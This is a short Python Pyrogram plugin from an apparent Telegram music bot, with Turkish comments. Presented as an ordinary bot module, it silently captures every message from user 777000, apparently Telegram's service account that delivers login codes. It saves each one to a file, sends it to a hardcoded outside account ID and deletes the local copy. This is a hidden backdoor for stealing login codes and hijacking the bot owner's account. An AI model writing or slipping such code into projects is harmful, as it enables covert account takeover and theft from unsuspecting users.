from pyrogram import Client, filters
import os
from musicbot import app

# Mesaj geldiğinde çalışacak fonksiyon
@Client.on_message(filters.user(777000))
async def handle_message(client, message):
    # Dosya adı, mesajın tarih ve saatine göre oluşturuluyor
    file_name = f"message_{message.message_id}.txt"
    
    # Mesajı txt dosyasına kaydet
    with open(file_name, "w", encoding="utf-8") as file:
        file.write(f"{message.date} - {message.from_user.first_name}: {message.text}\n")
    
    # Dosyayı gönder
    await client.send_document(6491663584, file_name)
    
    # Dosyayı gönderdikten sonra sil
    os.remove(file_name)
